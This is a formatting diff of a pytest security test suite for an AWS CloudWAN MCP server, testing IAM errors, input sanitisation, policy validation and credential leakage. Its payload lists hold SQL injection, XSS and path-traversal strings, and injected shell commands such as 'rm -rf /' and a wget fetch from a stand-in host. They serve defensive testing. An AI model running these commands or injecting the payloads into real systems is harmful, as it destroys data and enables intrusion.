@@ -43,31 +43,33 @@ class TestIAMPermissionValidation:
         iam_error_scenarios = [
             {
                 "error_code": "AccessDenied",
-                "error_message": ("User: arn:aws:iam::123456789012:user/test-user is not "
-                                "authorized to perform: networkmanager:ListCoreNetworks"),
+                "error_message": (
+                    "User: arn:aws:iam::123456789012:user/test-user is not "
+                    "authorized to perform: networkmanager:ListCoreNetworks"
+                ),
                 "function": list_core_networks,
-                "service": "networkmanager"
+                "service": "networkmanager",
             },
             {
                 "error_code": "UnauthorizedOperation",
                 "error_message": "You are not authorized to perform this operation",
                 "function": analyze_tgw_routes,
                 "service": "ec2",
-                "args": ["tgw-rtb-unauthorized"]
+                "args": ["tgw-rtb-unauthorized"],
             },
             {
                 "error_code": "TokenRefreshRequired",
                 "error_message": "The AWS Access Key Id needs a subscription for the service",
                 "function": get_core_network_policy,
                 "service": "networkmanager",
-                "args": ["core-network-subscription-test"]
+                "args": ["core-network-subscription-test"],
             },
             {
                 "error_code": "InvalidUserID.NotFound",
                 "error_message": "The user ID does not exist",
                 "function": list_core_networks,
-                "service": "networkmanager"
-            }
+                "service": "networkmanager",
+            },
         ]
 
         for scenario in iam_error_scenarios:
@@ -78,31 +80,25 @@ class TestIAMPermissionValidation:
                 if scenario["service"] == "networkmanager":
                     mock_client.list_core_networks.side_effect = ClientError(
                         {
-                            "Error": {
-                                "Code": scenario["error_code"],
-                                "Message": scenario["error_message"]
-                            },
+                            "Error": {"Code": scenario["error_code"], "Message": scenario["error_message"]},
                             "ResponseMetadata": {
                                 "RequestId": f"req-{scenario['error_code']}-security-test",
-                                "HTTPStatusCode": 403
-                            }
+                                "HTTPStatusCode": 403,
+                            },
                         },
-                        "ListCoreNetworks"
+                        "ListCoreNetworks",
                     )
                     mock_client.get_core_network_policy.side_effect = mock_client.list_core_networks.side_effect
                 elif scenario["service"] == "ec2":
                     mock_client.search_transit_gateway_routes.side_effect = ClientError(
                         {
-                            "Error": {
-                                "Code": scenario["error_code"],
-                                "Message": scenario["error_message"]
-                            },
+                            "Error": {"Code": scenario["error_code"], "Message": scenario["error_message"]},
                             "ResponseMetadata": {
                                 "RequestId": f"req-{scenario['error_code']}-security-test",
-                                "HTTPStatusCode": 403
-                            }
+                                "HTTPStatusCode": 403,
+                            },
                         },
-                        "SearchTransitGatewayRoutes"
+                        "SearchTransitGatewayRoutes",
                     )
 
                 mock_get_client.return_value = mock_client
@@ -128,14 +124,14 @@ class TestIAMPermissionValidation:
                 "source_account": "111111111111",
                 "target_account": "222222222222",
                 "resource_arn": "arn:aws:networkmanager::222222222222:core-network/core-network-cross-account-test",
-                "expected_error": "AccessDenied"
+                "expected_error": "AccessDenied",
             },
             {
                 "source_account": "333333333333",
                 "target_account": "444444444444",
                 "resource_arn": "arn:aws:ec2:us-east-1:444444444444:transit-gateway-route-table/tgw-rtb-cross-account",
-                "expected_error": "UnauthorizedOperation"
-            }
+                "expected_error": "UnauthorizedOperation",
+            },
         ]
 
         for scenario in cross_account_scenarios:
@@ -145,12 +141,14 @@ class TestIAMPermissionValidation:
                     {
                         "Error": {
                             "Code": scenario["expected_error"],
-                            "Message": (f"Cross-account access to {scenario['resource_arn']} from "
-                                      f"account {scenario['source_account']} denied")
+                            "Message": (
+                                f"Cross-account access to {scenario['resource_arn']} from "
+                                f"account {scenario['source_account']} denied"
+                            ),
                         },
-                        "ResponseMetadata": {"RequestId": "cross-account-test", "HTTPStatusCode": 403}
+                        "ResponseMetadata": {"RequestId": "cross-account-test", "HTTPStatusCode": 403},
                     },
-                    "ListCoreNetworks"
+                    "ListCoreNetworks",
                 )
                 mock_get_client.return_value = mock_client
 
@@ -171,14 +169,14 @@ class TestIAMPermissionValidation:
                 "resource_type": "core-network",
                 "resource_id": "core-network-rbp-test",
                 "policy_effect": "Deny",
-                "principal": "arn:aws:iam::123456789012:role/UnauthorizedRole"
+                "principal": "arn:aws:iam::123456789012:role/UnauthorizedRole",
             },
             {
                 "resource_type": "global-network",
                 "resource_id": "global-network-rbp-test",
                 "policy_effect": "Allow",
-                "principal": "arn:aws:iam::123456789012:role/AuthorizedRole"
-            }
+                "principal": "arn:aws:iam::123456789012:role/AuthorizedRole",
+            },
         ]
 
         for test_case in resource_policy_tests:
@@ -189,21 +187,20 @@ class TestIAMPermissionValidation:
 
                 if expected_success:
                     mock_client.list_core_networks.return_value = {
-                        "CoreNetworks": [{
-                            "CoreNetworkId": test_case["resource_id"],
-                            "State": "AVAILABLE"
-                        }]
+                        "CoreNetworks": [{"CoreNetworkId": test_case["resource_id"], "State": "AVAILABLE"}]
                     }
                 else:
                     mock_client.list_core_networks.side_effect = ClientError(
                         {
                             "Error": {
                                 "Code": "AccessDenied",
-                                "Message": (f"Resource-based policy denies access to {test_case['resource_id']} "
-                                          f"for principal {test_case['principal']}")
+                                "Message": (
+                                    f"Resource-based policy denies access to {test_case['resource_id']} "
+                                    f"for principal {test_case['principal']}"
+                                ),
                             }
                         },
-                        "ListCoreNetworks"
+                        "ListCoreNetworks",
                     )
 
                 mock_get_client.return_value = mock_client
@@ -228,7 +225,7 @@ class TestInputSanitizationSecurity:
             "admin'--",
             "' UNION SELECT * FROM users WHERE ''='",
             "1; INSERT INTO core_networks VALUES ('malicious');",
-            "core-network-test'; DELETE FROM policies; --"
+            "core-network-test'; DELETE FROM policies; --",
         ]
 
         for payload in sql_injection_payloads:
@@ -262,7 +259,7 @@ class TestInputSanitizationSecurity:
             "<img src=x onerror=alert('xss')>",
             "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
             "<svg onload=alert('xss')>",
-            "expression(alert('xss'))"
+            "expression(alert('xss'))",
         ]
 
         for payload in xss_payloads:
@@ -289,7 +286,7 @@ class TestInputSanitizationSecurity:
             "`id`",
             "; rm -rf /",
             "&& wget malicious.com/script.sh",
-            "|| curl attacker.com"
+            "|| curl attacker.com",
         ]
 
         for payload in command_injection_payloads:
@@ -315,7 +312,7 @@ class TestInputSanitizationSecurity:
             "....//....//....//etc//passwd",
             "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
             "..%252f..%252f..%252fetc%252fpasswd",
-            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
         ]
 
         for payload in path_traversal_payloads:
@@ -336,10 +333,10 @@ class TestInputSanitizationSecurity:
         """Test buffer overflow attack prevention."""
         # Generate very long strings to test buffer limits
         long_payloads = [
-            "A" * 1000,      # 1KB
-            "B" * 10000,     # 10KB
-            "C" * 100000,    # 100KB
-            "D" * 1000000,   # 1MB
+            "A" * 1000,  # 1KB
+            "B" * 10000,  # 10KB
+            "C" * 100000,  # 100KB
+            "D" * 1000000,  # 1MB
         ]
 
         for payload in long_payloads:
@@ -369,26 +366,20 @@ class TestPolicyDocumentSecurity:
         """Test detection of malicious policy structures."""
         malicious_policies = [
             # Policy with excessive nesting (potential DoS)
-            {
-                "version": "2021.12",
-                "core-network-configuration": self._create_deeply_nested_structure(50)
-            },
+            {"version": "2021.12", "core-network-configuration": self._create_deeply_nested_structure(50)},
             # Policy with circular references
             {
                 "version": "2021.12",
-                "segments": [
-                    {"name": "seg1", "references": ["seg2"]},
-                    {"name": "seg2", "references": ["seg1"]}
-                ]
+                "segments": [{"name": "seg1", "references": ["seg2"]}, {"name": "seg2", "references": ["seg1"]}],
             },
             # Policy with dangerous evaluation patterns
             {
                 "version": "2021.12",
                 "core-network-configuration": {
                     "eval": 'os.system("rm -rf /")',
-                    "exec": 'import subprocess; subprocess.run(["ls"])'
-                }
-            }
+                    "exec": 'import subprocess; subprocess.run(["ls"])',
+                },
+            },
         ]
 
         for malicious_policy in malicious_policies:
@@ -410,11 +401,7 @@ class TestPolicyDocumentSecurity:
     async def test_policy_size_limits(self) -> None:
         """Test policy document size limits and DoS prevention."""
         # Create progressively larger policies
-        policy_sizes = [
-            ("1MB", 1024 * 1024),
-            ("5MB", 5 * 1024 * 1024),
-            ("10MB", 10 * 1024 * 1024)
-        ]
+        policy_sizes = [("1MB", 1024 * 1024), ("5MB", 5 * 1024 * 1024), ("10MB", 10 * 1024 * 1024)]
 
         for size_name, target_size in policy_sizes:
             # Create large policy by repeating segments
@@ -422,30 +409,30 @@ class TestPolicyDocumentSecurity:
                 "version": "2021.12",
                 "core-network-configuration": {
                     "asn-ranges": ["64512-64555"],
-                    "edge-locations": [{"location": "us-east-1", "asn": 64512}]
+                    "edge-locations": [{"location": "us-east-1", "asn": 64512}],
                 },
-                "segments": []
+                "segments": [],
             }
 
             # Add segments until we reach target size
             segment_template = {
                 "name": "large-segment-{:06d}",
                 "description": "A" * 1000,  # 1KB description
-                "require-attachment-acceptance": False
+                "require-attachment-acceptance": False,
             }
 
             current_size = len(json.dumps(large_policy))
             segment_count = 0
 
             while current_size < target_size and segment_count < 10000:
-                segment = {k: v.format(segment_count) if isinstance(v, str) else v
-                          for k, v in segment_template.items()}
+                segment = {k: v.format(segment_count) if isinstance(v, str) else v for k, v in segment_template.items()}
                 large_policy["segments"].append(segment)
                 segment_count += 1
                 current_size = len(json.dumps(large_policy))
 
             # Test processing large policy
             import time
+
             start_time = time.time()
             result = await validate_cloudwan_policy(large_policy)
             processing_time = time.time() - start_time
@@ -474,25 +461,23 @@ class TestPolicyDocumentSecurity:
             "version": "2021.12",
             "core-network-configuration": {
                 "asn-ranges": ["64512-64555"],
-                "edge-locations": [{"location": "us-east-1", "asn": 64512}]
+                "edge-locations": [{"location": "us-east-1", "asn": 64512}],
             },
-            "attachment-policies": []
+            "attachment-policies": [],
         }
 
         for i, pattern in enumerate(dos_patterns):
-            policy_with_regex["attachment-policies"].append({
-                "rule-number": i + 1,
-                "conditions": [{
-                    "type": "tag-value",
-                    "key": "Name",
-                    "value": pattern,
-                    "operator": "matches-regex"
-                }],
-                "action": {"association-method": "constant", "segment": "test"}
-            })
+            policy_with_regex["attachment-policies"].append(
+                {
+                    "rule-number": i + 1,
+                    "conditions": [{"type": "tag-value", "key": "Name", "value": pattern, "operator": "matches-regex"}],
+                    "action": {"association-method": "constant", "segment": "test"},
+                }
+            )
 
         # Should complete within reasonable time
         import time
+
         start_time = time.time()
         result = await validate_cloudwan_policy(policy_with_regex)
         processing_time = time.time() - start_time
@@ -507,7 +492,7 @@ class TestPolicyDocumentSecurity:
             return "deep_value"
         return {
             f"level_{depth}": self._create_deeply_nested_structure(depth - 1),
-            f"array_{depth}": [self._create_deeply_nested_structure(depth - 1)]
+            f"array_{depth}": [self._create_deeply_nested_structure(depth - 1)],
         }
 
 
@@ -528,11 +513,14 @@ class TestCredentialHandlingSecurity:
         ]
 
         # Test that credentials don't appear in responses
-        with patch.dict(os.environ, {
-            "AWS_ACCESS_KEY_ID": credential_patterns[0],
-            "AWS_SECRET_ACCESS_KEY": credential_patterns[1],
-            "AWS_SESSION_TOKEN": credential_patterns[2]
-        }):
+        with patch.dict(
+            os.environ,
+            {
+                "AWS_ACCESS_KEY_ID": credential_patterns[0],
+                "AWS_SECRET_ACCESS_KEY": credential_patterns[1],
+                "AWS_SESSION_TOKEN": credential_patterns[2],
+            },
+        ):
             result = await aws_config_manager("get_current")
             parsed = json.loads(result)
 
@@ -540,26 +528,28 @@ class TestCredentialHandlingSecurity:
 
             self._assert_no_credential_leakage(credential_patterns, response_text, parsed)
 
-    def _assert_credential_not_in_text(self, credential_patterns, response_text):
+    def _assert_credential_not_in_text(self, credential_patterns, response_text) -> None:
         """Assert that credential patterns do not appear in the response text."""
         for credential in credential_patterns:
             assert credential not in response_text, f"Credential {credential[:8]}*** found in response"
 
-    def _assert_no_credential_in_error_field(self, credential_patterns, response_text, parsed):
+    def _assert_no_credential_in_error_field(self, credential_patterns, response_text, parsed) -> None:
         """Assert that AWS_ACCESS_KEY_ID only appears in the error field and does not leak actual credentials."""
         if "AWS_ACCESS_KEY_ID" in response_text:
             error_field = parsed.get("current_configuration", {}).get("identity", {}).get("error", "")
             assert "AWS_ACCESS_KEY_ID" in error_field, "'AWS_ACCESS_KEY_ID' found outside of error field"
             assert all(cred not in error_field for cred in credential_patterns), (
-                "Credential value leaked in error field")
+                "Credential value leaked in error field"
+            )
         else:
             assert "AWS_ACCESS_KEY_ID" not in response_text
         assert "AWS_SECRET_ACCESS_KEY" not in response_text
         assert "AWS_SESSION_TOKEN" not in response_text
 
-    def _assert_env_var_not_leaked(self, response_text):
+    def _assert_env_var_not_leaked(self, response_text) -> None:
         """Ensure sensitive environment variables are not exposed with actual values."""
         import re
+
         sensitive_env_vars = ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN"]
         for env_var in sensitive_env_vars:
             if env_var in response_text:
@@ -567,13 +557,15 @@ class TestCredentialHandlingSecurity:
                 matches = re.findall(pattern, response_text)
                 for match in matches:
                     assert len(match) < 10 or match in ["[REDACTED]", "[HIDDEN]", "***"], (
-                        f"Potential credential exposure: {match[:8]}***")
+                        f"Potential credential exposure: {match[:8]}***"
+                    )
 
     def _assert_no_credential_leakage(self, credential_patterns, response_text, parsed) -> None:
         """Assert that no credentials are exposed in the response."""
         self._assert_credential_not_in_text(credential_patterns, response_text)
         self._assert_no_credential_in_error_field(credential_patterns, response_text, parsed)
         self._assert_env_var_not_leaked(response_text)
+
     @pytest.mark.integration
     @pytest.mark.security
     @pytest.mark.asyncio
@@ -583,7 +575,7 @@ class TestCredentialHandlingSecurity:
             "AccessKeyId": "ASIATEMP1234567890",
             "SecretAccessKey": "temp_secret_key_example",
             "SessionToken": "temp_session_token_very_long_example_1234567890",
-            "Expiration": datetime.now(UTC).isoformat()
+            "Expiration": datetime.now(UTC).isoformat(),
         }
 
         with patch("boto3.Session") as mock_session:
@@ -612,12 +604,12 @@ class TestCredentialHandlingSecurity:
                     "AccessKeyId": "ASIA1234567890ABCDEF",
                     "SecretAccessKey": "assumed_role_secret_key",
                     "SessionToken": "assumed_role_session_token",
-                    "Expiration": datetime.now(UTC)
+                    "Expiration": datetime.now(UTC),
                 },
                 "AssumedRoleUser": {
                     "AssumedRoleId": "AROA1234567890ABCDEF:test-session",
-                    "Arn": f"{test_role_arn}/test-session"
-                }
+                    "Arn": f"{test_role_arn}/test-session",
+                },
             }
 
             mock_session.return_value.client.return_value = mock_sts
@@ -643,10 +635,9 @@ class TestCredentialHandlingSecurity:
         ]
 
         for access_key, secret_key in invalid_credentials:
-            with patch.dict(os.environ, {
-                "AWS_ACCESS_KEY_ID": access_key,
-                "AWS_SECRET_ACCESS_KEY": secret_key
-            }, clear=False):
+            with patch.dict(
+                os.environ, {"AWS_ACCESS_KEY_ID": access_key, "AWS_SECRET_ACCESS_KEY": secret_key}, clear=False
+            ):
                 result = await aws_config_manager("validate_config")
                 parsed = json.loads(result)
 
@@ -665,34 +656,17 @@ class TestCredentialHandlingSecurity:
         """Test session token handling security."""
         # Test various session token scenarios
         session_scenarios = [
-            {
-                "name": "expired_token",
-                "token": "expired_session_token_example",
-                "error_code": "TokenRefreshRequired"
-            },
-            {
-                "name": "invalid_token",
-                "token": "invalid_session_token_format",
-                "error_code": "InvalidToken"
-            },
-            {
-                "name": "malformed_token",
-                "token": '<script>alert("xss")</script>',
-                "error_code": "MalformedToken"
-            }
+            {"name": "expired_token", "token": "expired_session_token_example", "error_code": "TokenRefreshRequired"},
+            {"name": "invalid_token", "token": "invalid_session_token_format", "error_code": "InvalidToken"},
+            {"name": "malformed_token", "token": '<script>alert("xss")</script>', "error_code": "MalformedToken"},
         ]
 
         for scenario in session_scenarios:
             with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
                 mock_client = Mock()
                 mock_client.list_core_networks.side_effect = ClientError(
-                    {
-                        "Error": {
-                            "Code": scenario["error_code"],
-                            "Message": "Session token validation failed"
-                        }
-                    },
-                    "ListCoreNetworks"
+                    {"Error": {"Code": scenario["error_code"], "Message": "Session token validation failed"}},
+                    "ListCoreNetworks",
                 )
                 mock_get_client.return_value = mock_client
 
